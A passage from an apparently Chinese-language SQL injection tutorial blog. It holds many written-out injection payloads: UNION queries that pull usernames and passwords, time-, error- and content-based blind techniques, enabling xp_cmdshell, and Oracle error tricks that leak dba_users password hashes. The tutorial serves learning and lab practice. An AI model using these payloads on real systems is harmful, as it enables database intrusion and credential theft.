class="token keyword">bit</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样返回了很多底层的信息</p><p>使用具有标志性的字符串或者语句注入，在返回结果（报错结果）中寻找改字符串或者语句的执行结果，如果找到了，这儿就可以作为注入点。</p><p>SQL Server内置变量</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">@<span class="token variable">@version</span>:数据库服务器版本。@<span class="token variable">@servemame</span>:安装<span class="token keyword">SQL</span> Server的服务器名称。@<span class="token variable">@language</span>：当前所使用语言的名称。@<span class="token variable">@spid</span>：当前用户的进程ID。可以使用下列查询获取详细的版本信息：<span class="token keyword">SELECT</span> SERVERPROPERTYCproductversion’<span class="token punctuation">)</span>：例如<span class="token number">100.1600</span><span class="token number">.22</span>。 <span class="token keyword">SELECT</span> SERVERPROPERTY<span class="token punctuation">(</span><span class="token string">'productlevel'</span><span class="token punctuation">)</span>:例如 RTM。<span class="token keyword">SELECT</span> SERVERPROPERTY<span class="token punctuation">(</span><span class="token string">'edition'</span><span class="token punctuation">)</span>:例如 Enterprise。<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>msver：更多详细信息，包括处理器数量、处理器类型、物理内存等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="盲追踪"><a href="#盲追踪" class="headerlink" title="盲追踪"></a>盲追踪</h4><p>应用不会返回信息时，利用不同数据库使用SQL语法不同产生的差异来判断数据库类型。</p><h5 id="连接字符串的方式"><a href="#连接字符串的方式" class="headerlink" title="连接字符串的方式"></a>连接字符串的方式</h5><p>用不同的支付串连接方式注入，通过原始请求返回结果对比，若相同，则为对应数据库。</p><p><img src="https://images.dadream.eu.org/images/2024/07/db5df62ba1c448f7b78f246d43b03ad3.png"></p><h5 id="数字函数"><a href="#数字函数" class="headerlink" title="数字函数"></a>数字函数</h5><p>相当于不同数据库的特征值，原理和前面相似</p><p><img src="https://images.dadream.eu.org/images/2024/07/87b6f9ee5436f469cb58fd426a00d7c1.png"></p><p>例如，成功注入<code>WAITEOR DELAY</code>，表明数据库是mssql，成功注入<code>select pg_sleep(10)</code>，表明数据库是PostgreSQL</p><p>Mysql精确确定版本</p><p><code>/* !版本号 语句*/</code>若数据库版本号高于或等于！后面的，就会执行语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span> <span class="token comment">/* !40119 + 1*/</span><span class="token comment">-- 2（如果MySQL版本为4.01.19或更高版本）</span><span class="token comment">-- 1（其他情况）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="使用UNION语句提取数据"><a href="#使用UNION语句提取数据" class="headerlink" title="使用UNION语句提取数据"></a>使用UNION语句提取数据</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">column</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span>N <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token operator">-</span><span class="token number">1</span><span class="token keyword">UNION</span><span class="token keyword">SELECT</span> <span class="token keyword">column</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token keyword">column</span><span class="token operator">-</span>N <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token operator">-</span><span class="token number">2</span><span class="token comment">-- 去除重复值</span><span class="token keyword">UNION</span> <span class="token keyword">ALL</span><span class="token comment">-- 重复的也显示</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回有这两张表或者两个查询得到的数据</p><h4 id="匹配列"><a href="#匹配列" class="headerlink" title="匹配列"></a>匹配列</h4><p>满足要求</p><ul><li>两个查询的列数必须相同</li><li>两个select对应列返回的数据类型是兼容的</li></ul><p>如果无法满足这两个条件就会查询失败并返回一个错误，下面是一些数据库返回的错误</p><p><img src="https://images.dadream.eu.org/images/2024/07/e78b0ba30b6e81959a8c7d560b34f51b.png"></p><p>要得到正确的列数，两种方法</p><ul><li><p>每次增加列数，不断尝试</p><p>NULL值会转化为其他任何数据类型，这样能避免因数据类型不同而产生错误。</p><p>mysql</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+null-- </span>http:<span class="token comment">//test/?id=12+union+select+null,null-- </span>http:<span class="token comment">//test/?id=12+union+select+null,null,null-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>oracle要求每个select必须带from，使用dual（所用用户都能访问）表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+null+from+dual-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用order by字句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=12+order+by+1</span>http:<span class="token comment">//sql/Less-2/?id=12+order+by+2</span>http:<span class="token comment">//sql/Less-2/?id=12+order+by+3</span><span class="token comment">-- etc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>若3报错了，2未报错，那么就是两列</p><p>相对下，第二种更优，可以使用二分查找</p></li></ul><h4 id="匹配数据类型"><a href="#匹配数据类型" class="headerlink" title="匹配数据类型"></a>匹配数据类型</h4><p>假设需要查询一个字符串值，利用一个支付串值一个一个依次替换NULL值，只要不报错，就能确定位置。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+' test',NULL,NULL,NULL </span>http:<span class="token comment">//test/?id=12+union+select+NULL,'test',NULL,NULL </span>http:<span class="token comment">//test/?id=12+union+select+NULL,NULL,'test',NULL </span>http:<span class="token comment">//test/?id=12+union+select+NULL,NULL,NULL,'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>有些数据库不能使用NULL，只能暴力破解，使用自动化工具</p><p>假设最后一个位置是字符串值，便可以开始检索想要获得的值</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+NULL,version(),NULL,NULL</span><span class="token comment">-- 获取版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以连接多条语句返回多条信息</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+NULL,concat(version(),0x7e,database()),NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想要检索的不是字符串字，却只有支付串值的字段，可以使用强制转换为字符串</p><p><img src="https://images.dadream.eu.org/images/2024/07/2a1757616fa87006e38575c695c27afd.png"></p><p>PostgreSQL允许使用<code>||</code>连接字符串，只要有一个变量是字符串即可作为字符串值</p><h4 id="只返回一条结果"><a href="#只返回一条结果" class="headerlink" title="只返回一条结果"></a>只返回一条结果</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=12 union select NULL,username,password from users</span><span class="token comment">-- 正常来说这条语句可以返回表中所有数据，但是有时只会返回一条数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=1 and 1=0 union select NULL,username,password from users</span><span class="token comment">-- 将前面的查询拼凑成永假式，将返回后面的第一个结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=0 union select NULL,username,password from users limit 1,1 -- </span><span class="token comment">-- 加一个限制条件返回第二条数据，where也行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="使用条件语句"><a href="#使用条件语句" class="headerlink" title="使用条件语句"></a>使用条件语句</h3><p>构建条件语句，条件语句的执行结果强迫服务器返回不同的结果，由结果的状态来判断条件是否为真</p><p><img src="https://images.dadream.eu.org/images/2024/07/ad493d6543d96db885d9a1428870d1ea.png"></p><h4 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h4><p>基于Web应用响应时间上的差异，该时间取决于某些信息的值。</p><h5 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">;</span>Microsoft <span class="token keyword">SQL</span> Server <span class="token number">2005</span> <span class="token operator">-</span> <span class="token number">9.00</span><span class="token number">.3042</span><span class="token number">.00</span> <span class="token punctuation">(</span>Intel X86<span class="token punctuation">)</span>Feb <span class="token number">9</span> <span class="token number">2007</span> <span class="token number">22</span>:<span class="token number">47</span>:<span class="token number">07</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1988</span><span class="token operator">-</span><span class="token number">2005</span> Microsoft Corporation Standard Edition <span class="token keyword">on</span> Windows NT <span class="token number">5.2</span> <span class="token punctuation">(</span>Build <span class="token number">3790</span>: Service Pack <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12;if+(system_user='sa')+WAITFOR+DELAY+'0:0:5'-- </span><span class="token comment">-- 若system_user用户是系统管理员账户'sa',则会执行后面的waitfor delay函数，页面延迟5s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:5'</span><span class="token comment">-- </span><span class="token comment">-- 截取@@version的第25个字符是否为5，为5就是2005数据库，并且延迟返回</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>跑个脚本能把这一整段跑出来，精确判断，判断补丁，利用补丁攻击</p><p><img src="https://images.dadream.eu.org/images/2024/07/611e433cc3ffdeba5e68dcaaa0a90f0d.png"></p><p><a href="https://www.sqlteam.com/articles/sql-server-versions">SQL Server Version - SQLTeam.com</a></p><p>如果有管理员权限，可以使用xp_cmdshell扩展储存过程来产生延迟，它通过加载一条需要花费特定秒数的命令来实现。</p><p>启用xp_cmdshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- sql server 2005 2008</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>GO<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell*'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- sql server 2000</span><span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token string">'xplog70.dll'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'ping -n 5 127.0.0.1'</span><span class="token comment">-- ping回路5s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> benchmark<span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">,</span>sha1<span class="token punctuation">(</span><span class="token string">'blah'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 执行后面的语句1000000次</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 睡眠5s 配合if使用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> pg_sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- unix</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> sleep <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">int</span> <span class="token keyword">AS</span> <span class="token string">'/lib/libc.so.6'</span><span class="token punctuation">,</span><span class="token string">'sleep'</span> <span class="token keyword">language</span> <span class="token string">'C'</span> STRICT<span class="token punctuation">;</span> <span class="token keyword">SELECT</span> sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_http<span class="token punctuation">.</span>request <span class="token punctuation">(</span><span class="token string">' http://10.0.0.1/ '</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span> <span class="token keyword">select</span> HTTPURITYPE<span class="token punctuation">(</span><span class="token string">' http://10.0.0.1/ '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getclob<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span class="token comment">-- 使用UTL HTTP或HTTPURITYPE向一个'死的'IP地址发送一个HTTP请求查询将一直等待连接直到超时</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> decode<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">-- 笛卡尔积</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="基于错误"><a href="#基于错误" class="headerlink" title="基于错误"></a>基于错误</h4><p>返回两种状态，其中一种状态是错误</p><p>sql server</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/is_srvrolemember('sysadmin')</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>is_srvrolemember()是SQL Server T-SQL的一个函数，返回</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>：如果用户属于指定的组。<span class="token number">0</span>：如果用户不属于指定的组。NULL：如果指定的组不存在。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>意思很明确，返回1的话就会拼接成12/1,id=12会返回结果，0则报错，具体报错不深究</p><p>case语句也能这样使用，堆叠不能用它都能用</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(system_user='sa')+then+1+else+0+end)</span>http:<span class="token comment">//sql/Less-2/?id=12/(if(1=1,1,0))</span>http:<span class="token comment">//sql/Less-2/?id=12/(case 1 when 1 then 1 else 0 end)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="基于内容"><a href="#基于内容" class="headerlink" title="基于内容"></a>基于内容</h4><p>执行语句返回内容和不执行返回的内容不同，相比于基于时间，基于错误会更快，基于内容不会产生错误，有点不言而喻。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=10%2B(if(1=1,1,0))</span><span class="token comment">-- 若成功执行if语句,就会返回id=11的结果，对比10不同</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="处理字符串"><a href="#处理字符串" class="headerlink" title="处理字符串"></a>处理字符串</h4><p>前面介绍的都是数值上的技术，这段介绍字符上的技巧</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12</span><span class="token comment">-- 正常查询，id=13时结果为空，sql语句为</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'12'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2B'2</span><span class="token comment">-- 结果和上面相同，因为连接成了12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这时可以将char()函数放在2的位置测试</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2Bchar(50)'</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行结果和前面相同，这是可以将条件语句插入2的位置</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2Bchar(49%2B(case+when+(system_user+=+'sa')+then+l+else+0+end))'</span><span class="token comment">-- 如果是sa执行后id=13，不是则id=12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>根据结果的不同可以判断条件</p><h4 id="拓展攻击"><a href="#拓展攻击" class="headerlink" title="拓展攻击"></a>拓展攻击</h4><p>简而言之，不在局限于判断sa用户了，而是得到所有信息，先得到用户名长度</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+16)+then+1+else+0+end)</span>http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+12)+then+1+else+0+end)</span>http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+10)+then+1+else+0+end)</span><span class="token comment">-- 二分查找，错误和成功的交界就是正确的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下一次查找组成用户名的每个值</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(ascii(substring(select+system_user),1,1))+&gt;+64)+then+1+else+0+end)</span><span class="token comment">-- 二分查找</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这些过程一般都交给自动化脚本</p><h4 id="利用SQL注入错误"><a href="#利用SQL注入错误" class="headerlink" title="利用SQL注入错误"></a>利用SQL注入错误</h4><p>将检索的信息注入进报错信息中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=system_user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e07'</span> <span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Conversion failed when converting the nvarchar value <span class="token string">'appdbuser'</span> to data <span class="token builtin class-name">type</span> int./products.asp, line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>appdbuser</code>很明显这个返回能做文章，使用前面提到的<code>is_srvrolemember</code>的返回值强制类型转换</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=char(65%2Bis_srvrolemember('sysadmin'))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e07'</span> <span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Conversion failed when converting the nvarchar value <span class="token string">'B'</span> to data <span class="token builtin class-name">type</span> int. /products.asp, line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果当前用户不属于sysadmin组，那么is srvrolemember将返回0，char(65+0)将返回字母A,如果当前用户拥有管理员权限，那么is_srvrolemember将返回1, char(65+1)将返回字母B。</p><p><code>having 1=1</code>基于报错，枚举当前查询用得列名，通常和<code>group by</code>一起使用，group by将已查询到的列去除，再次枚举现在第一列，sql server能产生第一列错误信息</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span><span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Column <span class="token string">'products.id'</span> is invalid <span class="token keyword">in</span> the <span class="token keyword">select</span> list because it is not contained <span class="token keyword">in</span> either an aggregate <span class="token keyword">function</span> or the GROUP BY clause./products.asp, line <span class="token number">233</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>products.id</code>就是第一条列名，要查询第二条</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+group+by+products.id+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span> <span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span> <span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span><span class="token keyword">Column</span> <span class="token string">'products.name'</span> <span class="token operator">is</span> invalid <span class="token operator">in</span> the <span class="token keyword">select</span> list because it <span class="token operator">is</span> <span class="token operator">not</span> contained <span class="token operator">in</span> either an aggregate <span class="token keyword">function</span> <span class="token operator">or</span> the <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> clause<span class="token punctuation">.</span><span class="token operator">/</span>shop<span class="token punctuation">.</span>asp<span class="token punctuation">,</span> line <span class="token number">233</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第一列属于GROUP BY子句，因而该错误现在由第二列products.name触发。接下来将该列添加到GROUP BY子句，不需要清除前面的内容</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/shop.asp?id=1+group+by+products.id,products.name+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Oracle中的错误信息"><a href="#Oracle中的错误信息" class="headerlink" title="Oracle中的错误信息"></a>Oracle中的错误信息</h4><p><code>utl_inaddr</code>，该函数负责解析主机名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token string">'victim'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>ORA<span class="token operator">-</span><span class="token number">29257</span> : host victim unknownORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL_INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL_INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关注victim，和前面小节一样，向utl_inaddr传入的都会显示在错误中</p><p>用select语句替换victim，有个限制：只能返回一列和一行，否者会收到另一种报错信息ORA-01427错误消息：single-row subquery returns more than one row。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYS<span class="token operator">=</span>D4DF7931AB130E37 unknownORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL—INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL—INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> banner <span class="token keyword">from</span> v$version <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>ORA<span class="token operator">-</span><span class="token number">29257</span>: host ORACLE <span class="token keyword">DATABASE</span> <span class="token number">10</span>G <span class="token keyword">RELEASE</span> <span class="token number">10.2</span><span class="token number">.0</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token number">64</span>BIT PRODUCTION unknownORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL—INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL—INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>rownum=1是控制返回第几条，不然不能得到预期结果，||管道符拼接则是绕过只能返回一列的限制</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> rownum r<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> dba_users<span class="token punctuation">)</span> <span class="token keyword">where</span> r<span class="token operator">=</span><span class="token number">1</span>ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYS<span class="token operator">=</span>D4DF7931AB130E37 unknown<span class="token comment">-- 为避免所连接的字符串中出现单引号，可选用concat函数：</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>chr<span 